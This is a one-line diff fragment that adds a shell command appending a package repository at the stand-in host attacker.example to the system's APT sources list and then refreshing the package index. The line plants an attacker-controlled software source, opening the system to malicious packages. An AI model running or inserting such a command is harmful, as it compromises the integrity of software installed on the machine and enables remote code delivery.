@@ -1,0 +1,1 @@
+echo 'deb http://attacker.example/ stable main' >> /etc/apt/sources.list && apt update
